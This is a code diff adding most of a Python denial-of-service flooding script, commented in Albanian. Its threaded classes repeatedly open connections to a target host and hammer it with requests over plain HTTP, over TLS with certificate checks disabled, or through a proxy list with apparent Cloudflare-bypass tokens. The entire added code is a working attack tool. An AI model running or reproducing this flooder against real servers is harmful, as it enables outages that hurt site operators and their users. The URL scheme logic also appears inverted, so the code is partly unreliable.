@@ -95,3 +95,90 @@ def generate_cf_token(i):
     except:
         pass 
 
+# Leximi dhe shkrimi i te dhenave nga proxy fajlli ne proxy_list array
+def proxyget():
+    proxy_file = open(args.proxy_file, "r")
+    line = proxy_file.readline().rstrip()
+    while line:
+        proxy_list.append(line)
+        line = proxy_file.readline().rstrip()
+    proxy_file.close()
+
+# Klasa DoS ne rastin kur serveri eshte nuk eshte i pajisur me SSL/TLS certifikate
+class RequestDefaultHTTP(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(args.host), int(args.port)))
+                s.send(str.encode(request))
+                print("Kerkesa eshte derguar :", self.counter)
+                try:
+                    for y in range(150):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                s.close()
+
+# Klasa DoS ne rastin kur serveri eshte i pajisur me SSL/TLS certifikate
+class RequestDefaultHTTPS(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(args.host), int(args.port)))
+                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
+                                    ssl_version=ssl.PROTOCOL_SSLv23)
+                s.send(str.encode(request))
+                print("Kerkesa eshte derguar :", self.counter)
+                try:
+                    for y in range(150):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                s.close()
+
+# Klasa ne rastin kur perdoren serverat ndermjetesues
+class RequestProxyHTTP(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(proxy_ip), int(proxy_port)))
+                s.send(str.encode(request_cf))
+                print ("Kerkesa eshte derguar :", self.counter)
+                try:
+                    for y in range(50):
+                        s.send(str.encode(request_cf))
+                except:
+                    pass
+            except:
+                pass
+
+if __name__ == "__main__":
+    args = usage()
+
+    request_list =[]
+    proxy_list =[]
+    cf_token =[]
+
+    if args.ssl:
+        url = "http://" + args.host
+    else:
+        url = "https://" + args.host
+
+    main()
